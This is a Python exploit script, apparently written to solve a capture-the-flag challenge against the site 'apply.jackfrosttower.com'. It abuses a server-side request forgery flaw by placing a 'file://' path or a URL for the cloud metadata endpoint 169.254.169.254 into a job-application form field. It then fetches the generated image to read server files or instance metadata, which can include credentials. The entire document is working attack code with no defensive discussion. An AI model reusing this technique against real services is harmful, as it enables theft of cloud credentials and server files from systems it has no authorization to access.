#!/usr/bin/env python
import requests
import click


@click.command()
@click.option('-n', '--name', default="Alf the dyslexic elf", help='Your preferred name.')
@click.option('-a', '--api-endpoint', default="/", help='The IMDS API endpoint to query.')
@click.option('-f', '--file', help='The full path to a local file.')
def cli(name: str, api_endpoint: str, file: str):
    url = "https://apply.jackfrosttower.com"

    # Create the file or IMDS URI to retrieve
    if file:
        message = f"local file {file}"
        uri = f"file://{file}"
    else:
        message = f"IMDS {api_endpoint}"
        uri = f"http://169.254.169.254{api_endpoint}"

    # Application form fields
    params = {
        'inputName': name,
        'inputEmail': "",
        'inputPhone': "",
        'resumeFile': "",
        'inputWorkSample': uri,
        'additionalInformation': "",
        'submit': "",
    }

    # Submit the form
    sess = requests.Session()
    resp = sess.get(url, params=params)

    # If the request was successful, download the JPG file and print the contents
    if resp.status_code == 200 and "recipients rejoice!" in resp.text:
        print("Form submission successful.")
        print(f"Retrieving {message}:")
        print(sess.get(f"{url}/images/{name}.jpg").text)
    else:
        print("Error submitting form.")


if __name__ == '__main__':
    cli()
